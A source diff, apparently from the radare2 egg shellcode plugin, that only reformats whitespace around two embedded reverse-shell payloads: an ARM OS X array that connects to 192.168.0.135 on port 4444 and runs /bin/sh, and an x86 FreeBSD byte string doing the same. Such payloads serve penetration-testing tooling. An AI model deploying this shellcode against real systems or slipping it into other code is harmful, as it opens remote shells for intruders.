@@ -3,18 +3,19 @@
 #include <r_egg.h>
 
 
-unsigned long armle_osx_reverse[]= {
-  0xe3a00002, 0xe3a01001, 0xe3a02006, 0xe3a0c061, 0xef000080, 0xe1a0a000, 0xeb000001,
-        0x5c110200, //# port 4444
-        0x8700a8c0, //# host 192.168.0.135
-        0xe1a0000a, 0xe1a0100e, 0xe3a02010, 0xe3a0c062, 0xef000080,
-        0xe3a05002, 0xe3a0c05a, 0xe1a0000a, 0xe1a01005, 0xef000080,
-        0xe2455001, 0xe3550000, 0xaafffff8, 0xe3a00000, 0xe3a01001,
-        0xe3a0c07e, 0xef000080, 0xe0455005, 0xe1a0600d, 0xe24dd020,
-        0xe28f0014, 0xe4860000, 0xe5865004, 0xe1a01006, 0xe3a02000,
-        0xe3a0c03b, 0xef000080,
-        //# /bin/sh
-        0x6e69622f, 0x0068732f };
+unsigned long armle_osx_reverse[] = {
+	0xe3a00002, 0xe3a01001, 0xe3a02006, 0xe3a0c061, 0xef000080,
+	0xe1a0a000, 0xeb000001,
+	0x5c110200, //# port 4444
+	0x8700a8c0, //# host 192.168.0.135
+	0xe1a0000a, 0xe1a0100e, 0xe3a02010, 0xe3a0c062, 0xef000080,
+	0xe3a05002, 0xe3a0c05a, 0xe1a0000a, 0xe1a01005, 0xef000080,
+	0xe2455001, 0xe3550000, 0xaafffff8, 0xe3a00000, 0xe3a01001,
+	0xe3a0c07e, 0xef000080, 0xe0455005, 0xe1a0600d, 0xe24dd020,
+	0xe28f0014, 0xe4860000, 0xe5865004, 0xe1a01006, 0xe3a02000,
+	0xe3a0c03b, 0xef000080,
+	//# /bin/sh
+	0x6e69622f, 0x0068732f };
 
 unsigned char x86_freebsd_reverse[] =
 "\xeb\x68\x5e\x31\xc0\x31\xdb\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x53\xb0\x61"
@@ -26,7 +27,7 @@ unsigned char x86_freebsd_reverse[] =
 "\x43\x7f\x00\x00\x01\x2f\x62\x69\x6e\x2f\x73\x68";
 
 
-static RBuffer *build (REgg *egg) {
+static RBuffer *build(REgg *egg) {
 	RBuffer *buf = r_buf_new ();
 	const ut8 *sc = NULL;
 	int cd = 0;
